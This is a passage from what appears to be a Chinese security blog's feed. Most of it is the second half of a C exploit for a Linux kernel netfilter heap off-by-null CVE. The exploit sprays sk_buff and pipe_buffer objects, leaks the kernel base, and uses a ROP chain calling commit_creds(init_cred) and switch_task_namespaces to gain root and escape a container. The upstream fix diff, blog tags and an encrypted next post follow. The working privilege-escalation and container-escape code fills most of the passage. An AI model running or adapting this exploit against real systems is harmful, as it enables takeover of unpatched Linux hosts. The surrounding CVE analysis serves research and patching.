class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-comment">// switch to namespace init_nsproxy</span><br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = <span class="hljs-number">1</span>;<br>    rop_chain[rop_idx++] = kernel_offset + FIND_TASK_BY_VPID;<br>    rop_chain[rop_idx++] = kernel_offset + PUSH_RAX_POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + POP_RSI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_PROXY;<br>    rop_chain[rop_idx++] = kernel_offset + SWITCH_TASK_NAMESPACES;<br>    <span class="hljs-comment">// gain root privilege and return to userspace</span><br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_eflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1>0x03.漏洞修复</h1><p>内核主线在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d">这个 commit</a> 中完成了对该漏洞的修复，主要就是<strong>取消掉对 pad 置 0 的这一操作</strong>，而是选择在 <code>translate_compat_table()</code> 中进行预先的置 0，从而避免了为了将 pad 区域置 0 而导致的堆上 off-by-null，笔者个人认为这个方案还算是比较成功的</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-comment">index 6c26533480dd1..d6d45d820d79a 100644</span><br><span class="hljs-comment">--- a/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv4/netfilter/arp_tables.c</span><br><span class="hljs-meta">@@ -1193,6 +1193,8 @@</span> static int translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_ARP_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-comment">index f15bc21d73016..f77ea0dbe6562 100644</span><br><span class="hljs-comment">--- a/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv4/netfilter/ip_tables.c</span><br><span class="hljs-meta">@@ -1428,6 +1428,8 @@</span> translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-comment">index 2e2119bfcf137..eb2b5404806c6 100644</span><br><span class="hljs-comment">--- a/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-comment">+++ b/net/ipv6/netfilter/ip6_tables.c</span><br><span class="hljs-meta">@@ -1443,6 +1443,8 @@</span> translate_compat_table(struct net *net,<br> if (!newinfo)<br> goto out_unlock;<br> <br><span class="hljs-addition">+memset(newinfo-&gt;entries, 0, size);</span><br><span class="hljs-addition">+</span><br> newinfo-&gt;number = compatr-&gt;num_entries;<br> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;<br> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];<br><span class="hljs-comment">diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c</span><br><span class="hljs-comment">index 6bd31a7a27fc5..92e9d4ebc5e8d 100644</span><br><span class="hljs-comment">--- a/net/netfilter/x_tables.c</span><br><span class="hljs-comment">+++ b/net/netfilter/x_tables.c</span><br><span class="hljs-meta">@@ -733,7 +733,7 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,<br> &#123;<br> const struct xt_match *match = m-&gt;u.kernel.match;<br> struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;<br><span class="hljs-deletion">-int pad, off = xt_compat_match_offset(match);</span><br><span class="hljs-addition">+int off = xt_compat_match_offset(match);</span><br> u_int16_t msize = cm-&gt;u.user.match_size;<br> char name[sizeof(m-&gt;u.user.name)];<br> <br><span class="hljs-meta">@@ -743,9 +743,6 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,<br> match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);<br> else<br> memcpy(m-&gt;data, cm-&gt;data, msize - sizeof(*cm));<br><span class="hljs-deletion">-pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span><br><span class="hljs-deletion">-if (pad &gt; 0)</span><br><span class="hljs-deletion">-memset(m-&gt;data + match-&gt;matchsize, 0, pad);</span><br> <br> msize += off;<br> m-&gt;u.user.match_size = msize;<br><span class="hljs-meta">@@ -1116,7 +1113,7 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,<br> &#123;<br> const struct xt_target *target = t-&gt;u.kernel.target;<br> struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;<br><span class="hljs-deletion">-int pad, off = xt_compat_target_offset(target);</span><br><span class="hljs-addition">+int off = xt_compat_target_offset(target);</span><br> u_int16_t tsize = ct-&gt;u.user.target_size;<br> char name[sizeof(t-&gt;u.user.name)];<br> <br><span class="hljs-meta">@@ -1126,9 +1123,6 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,<br> target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);<br> else<br> memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));<br><span class="hljs-deletion">-pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="hljs-deletion">-if (pad &gt; 0)</span><br><span class="hljs-deletion">-memset(t-&gt;data + target-&gt;targetsize, 0, pad);</span><br> <br> tsize += off;<br> t-&gt;u.user.target_size = tsize;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;s&gt;喷子永远是版本答案&lt;/s&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="容器逃逸" scheme="http://blog.arttnba3.cn/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x03】Shell之外的往事：一桶凉泡面</title>
    <link href="http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/"/>
    <id>http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/</id>
    <published>2022-03-17T20:14:40.000Z</published>
    <updated>2022-08-18T17:44:41.489Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="链接：https://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw 提取码：cth0" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="5a816444af65b5cb990269ea3e666199714b2ce57c60d7d637bc36f624f1b864">eef143a3a3e51e2ee0b1e9c84de8c53cc91e34a664716adcbae4109613b0f512e4f2191695bdd8ebd253d7aea5fb72fb7441e7a0c717919bf2d685be72be9f75be9c0b46ac5c4ed5a3b6a6ea6de06fac4c5edf25ce8e8d006a840896a5cb4f51e5c10715433a90557928dbdaf6aded6e5d7a708487d68815a630a5870ac4c98934c6f24cc516f21d5a35e1b17b092ab65f6c4331d72572635ee97252661aebceb22f24fbe19a171fa90a495a4d3d1195b41b2602385834e289275d9648b0146aa227b58f9e9aa4344bdb3d1e059e671324f966ded030532e22354009e0ce5e8234a10c8aef8c101b930b03afbf9cc0b5a3cc672b359206249ac157983957666168b09532c8e79e9a1db246a5355e40d6f526cd93dec48fe776ffe90e7e06414e91edc121af7d93b27c7d1469c3d21b2a6cd58965b8af51223897d1b1488f85a04932a2806cbdbeec6169cef0edf8df963568b3482898a9bdbd66fdcb4cc943ff9c460f65a7bbe31df6e87849b779bfcd8536e3dfabcf5cdf415eb994b8f2b0b1c17e6fd782a8dbd84447f983b60bfe79442e3308b011a4a1191698595036a94034ca6453ff75fe98593e9ec83ff9c0e252e682a10c9b78831b9a8be0cb6cd28c5d77ee69e7c92b98ca4ab6499d7e1fb345175f77aa15481fe9066198ff7ff7d34ec9c009be4f446ef5df92d62136bf0b8ae969d5e8eda87a50750e4e406c91bb5380a02c25a06634c69abb875d7004bbe0f63377f62bb54aec666e34a1811492d04c134ac9f15d3da2d0e863a59401ddb138e5d46862bccc1440cbccdcc81f0f9fdeac52baf3b5ecc6410345d4f6e29b657e79f80fdc4522c66cf05f1df71357676e60f0132b408b0fcecbb781f3bac599d57c2fbeb5747efb4311990b4bef8e67d66ceb129bb308841b71fac583edb8175a5156412bc2bc78e2fa381cf7e56ecbe6a68361c2efd2a1e5ed3dac91b86061d0e543d63945e89b503bdbe6847f3f9d4e78ea56e8e776b41a1d2a3de6cb81c1022bfc661dfcd109a4359d671a106a057f80502c294cf966e011acf12c371580297359c2ccafe2d84ed42821043ed337fd6517b2a85bfbca80bba04f74dd006fda35b493f36def17a46aa7c5a8112f54167e0f6db97b5fdb775436e174bc470fbd65534cca718b857f2d0f5560d6800321d85b4f9ef595a3eb5d99172f35ab83255a744a041465a91588b55c448171a03fcf5c8847ba36c03f22487dfdc3cee2227869437bbec2696fbd27cdf78afd55c855d1c5e80620d06829d9c01bf95f618d54cab80040ba41e5dd6e99d11df1e4edf35242e899c7cad28b773d08ca5929a64682a896346fb67a3e1cc24be78fde14abb2fe0c9fbb39403b9d1c22f08440a9fa18cea1de270dd344052e2abe77b0aecf13e847567a9c7e6a8e3107838686e54f6ca7f1f7a879663ec60a8772a9ed24fddda6a6d1daf73abb85b84fbf304893434f8f1c8f2835cd973caa894431552ab6bf05962183a3ced903182afa9f901996bc7acf7bfa6c4570683c7a89554e5d2ee9196e63abc6e381e6f60f81dc9d5fe735d1b86f42a96b1546c64072c86f6455db19bb5d87a86a6a76bacc53217d3920fb316e89b40b5053dfbf768548cbf68750be0e0dc3e5b3dc8e43e6e92f2a153df9a6240344550671cd59041a0fb1d9ef339e254196eaf2fb5adf59f0c085a6d38bf0e5555ec006611bb9c8944c12e2b7c5ab7eb04612d7cde5e88899e48c019e1c3e60e201f6408614766579d8ec7b88d9ec679827ca6f0396ca029320be687f835607b61c6bfd5d2fd9f984b00c6a65e5b7812c0b7fe857de8a0ffa6e78c4c95474a9330fe6266616359a9daa5ff2c7e34791a70b0261ac7b62bd254f2f830b3f2183ac169f0a99248932db8ae751d58212187b69109d5c82a4dbe3b4a18832906c37923f7aa61dc069496ae9b6d730c2ec760eb22723e8e4bd9d3f6794715809a33206f3cbc8eedbb8bf2a7a28f5176f3aeaf03ea3865aea881788d8bae009cb453a4f2319b9c02e109116be08140d547928a7ff62b30238110f6ea0c62647d786d089956f762c044433ebbad0a017bcd56da12a30534da4d1877ac10efa89cc53dac73c0d0fd03d304e877688373b8f44cf6c40f93cb7086e0b9e6151982a767449f4fdcc5c9d7976e7be3ced0ac516bdff864ce6d5e40727e38f65b6784432a934f35b3bcd765f2997b9e0c70d1ac025b068b304aa3990f57d894e8c939485452981191c2b1fe4ca2ebb45b7632cfa67d7bffe4584c386dafd95884404666efbd29ab69278e93e84d85fb1da75df515cae0c6ae6fc3b09831fe3be9b91638535db0d29035887d93fb84e702509b917684ef4cdacdad222a3de9f28403f413c53d11340b309347e6f02d53c5d963505596a2b6e1b79f2d411bfd747d221d2d6df785364907ee2d942785748bf6701c6530084e1390e5877424a9a012f1ae410822d3441586c0c6ed4f4b1fd9373630ad8c7c7c0833b154d86f13d7a56188c82d7fb5da8e91fb5e6cee0bcec5988ec05af36fca855d8d6b9a813eef6c7837e87502f3ce2cef3e4e01cf85b24ee538e484678d6d938349521e91307bbcd64375aa017663147ee541b1f236c7d5228275780907590a61789590dcff46a6007fbd6422ed6315667d9a8c40e73a966f60bd49e7062ce81e03946f2c17b958d0a5e2838c1fc5d4cff2892c5e434a7a6141a7ce6feb9665f1a2d70cca5c5e3824fee236acb0b41742661d5d10bb9509a641de74e0142ae259f6ae512abb60e517eda215d34c9e76ec51dd1c01031cfcff8a569c58ed420113501cfecd50cf60f3bdb998d95453b390f72532d78e010b6301053ddbc88664032c9ec63a4359bffaa87dd5943443e12ff92d08b3a082db953e1f4762368c1e7fc3a0fd3bdbbd5d1b3b73da570b7771e684615b196fb3e2e924c79b97e88ad139586cc4c7d9fecb536f82e18bb3eb0fdd3ba692c45520506834a8ead804d449b8bdff734da737efd1f3955e2217c29bba86c7e7f71d3478682c4278a5c78fdc7b61ca9bc6895141ed46c4c138896002019d379bb852f84e66c4c5d030e466bf98e673bda7b0471324e61ce9dda2b4652a9f55614a5edb2e4a550ddc551fcbdfcefefe06ad9f6e8428eeed73800162a9209ec33ce878b8375e8bb8829406e510d32bdb33548b18eca6ed7500a069d454a7878c1ed44254b6f70a2bffb099dcfb38550795f47b0460451d6bb4858385666fefa62b8f79837cebac6f233436e7979df3a1a111011a8a181bbdc8306c536a7639b39b2ecef3c9269b23aad1f7054aa455beded250cb032d08e5a52a29547b1635091bafff15a44c40ca755062dab1c304a3bb2136304c222bd4cb9919e698096b461bd87c2de9b01e2518ce14c1b94b9cd136a66d2f6d9eef14023f1ee1977d16b1c4eb784f5e452e82d5ac0f36332a0a1e0566a2a4019b5cfb141cb3ece073eb89a6d344c91e24a991d4709df4dec332064a992abca890175bc4488b69683db222e3018564b8cc1675b5f10fe06ad923d13e0e28465f17d71d3811931749e5d069f655ce01f9fd2451be30b5fd5e2bcebb2923e81d6189e739b5732b3ff03ddd26dd46706e18a5a7669ba484b4fa336d537792315334baaf6a319ddfa03d0f0077d1f1a8ec3a466e1bd6be585b4248ec603069766a40bea7d16de80d5915a60713aab803eda7817e8d9ecedd3f403e992d4a0ef8453fc18ccf3f679bd44956d70e211d677c57b6cb5b56f154bd7d52d02c57b38cc39a0a49ce2a605ea5102035ad0445231526b219b6688678b1635e6d3392810f3bf975d785e7a2ca28291cdda91a96feeaf88585c1051bc258b49ab877eb4ddaa36c530d3c2dce13aa5090861250a597663bdcb6662fcc84c2c4c27586625752f808df9c38421f55ffb85c34cb8ff537fb2306d02a7338627d5df83541aa8d32baf42c8b09b4125f638db460b05cb915512ba9f1ff9e72228dc850de15366801116078006931c4310d398f5e1a1a0393719cf787fc7b60b9b7ef13b5a912f882a732e9da89ab11bda53e1070cf3987efb3b53afaf1d4d30e82eea1912ffdf0260b95ba0cefdfabc93db9595737c206858f898507fd4338c58a94bb3942757fad71fa2de0b99f28d98cace7e4beca371a0dc12b87fe1eae2c7cc1cee9216f44b83ae6dc9e9f53739091083d8ba06c741160a39a0065c8f9bce119ba35292f2367d8c5fc627b9fb38bc479a5c247daaad13d8af52fe5ff9677f2d6b313a2ab89fdb745f16ae166406182bf892befdb9687d0a12b0fb023726716b082d95ad5786938818ba5c75928ca8fc3a4e2d923a5a69095afabd2240223ec170bc1bc7325516d2df663408d67cd865edf15afb1de97acf04b74591bb3887164d715230ba3fe6046555d03e3d0ebe5ac1c5d065196d029ef7d20f8d973525ffb4d4373f44fe696ae12adcc4d4f0dbb31c7318ad7e62d5e9532e434e034272b68b51b9f36f90ea2089f5f11f34f82a7ecf896b13e6a82b15b6f1333a67d1c37b525489d2918f980a7a68061bb4c7ebcc9cdca0a05cc219a94362fc321c0cf4cdf7f6a13ec4fdca786c8c184c3af5031cde3c3038fe077356655fd522e691a8af65adb290afd5f1d880791679c708e8a36808095a133fc399ff2bfa37fadfa0e1e1d818c3547a412b812bc73ed1e109a1f2e4d016f2818cfd9906518be72f82ba9a3b0641931c10047d546fc3a1c8b36814b54403b94d3c314acacb00cfbe3705e685281e3ae3c44e5237fbb62b228fb5e10e638c3cb42d9757a2625eb9b8a90647353c0ad21d70570b00d35ac4194f81ef9569cf0ef24f57261ea00205c0705d55165bfd4658eeee934f46a37e3d69eabcc7652cb74164016a9c75cf4545e4fc57ad959a971a0f298d51416fdd60e9ee3d97da13ae1bd51da4d033c3d9f99302d6cbd61c52ec2a8f137b207db127ad7d09b94366d05a7f9b292988d583183d1f7f17d7c2015fece0685144c3fd6576e1835236021e72502916bcf7b0cc15d1833a1c9ee1897e6614d63306f9669fd7fb5e6899290544d27cac6c4e9363edefd59120d0a36b7b58574dda1de563e359e34ac8e11794b527ee30f6ae4fbf3c809db8d2e6956672289d4e23a61358245d57003de5e762618d0a879cf38638b7d18dcb68b7890a43e9ccfe6e4175ebcf0e8a1196769a7de0838638698ee662514caab43776878e63159ab4ac1400cbab2267173ab1882c3bc76513f5f6b5686e3f56d4041fa0ba86266fa1b2effc031bc075a98c2e33378b472a028d459ee363be205ffeecca2533eb3626e228a2095ff4dec8d84408192cd952ab3acb035a1454d621f33e1790cba1badb2f086a2388860180f21a870de28a9af48883da4dc65aeb4a155048048fe6d9d3b6648b7a15fca547a3eb84a97aec539932585d0bf2afb50e6e38f21d319f5698d82e02c2af3cfb415a0b548e7ea202e2e1295ec162fdf96175b2845edfa1fe7a791f8fb1dd17fea21d352dab997e6c16d9d87b46f1da6b13dea2f37793d33350ab475c3942db4eb856d472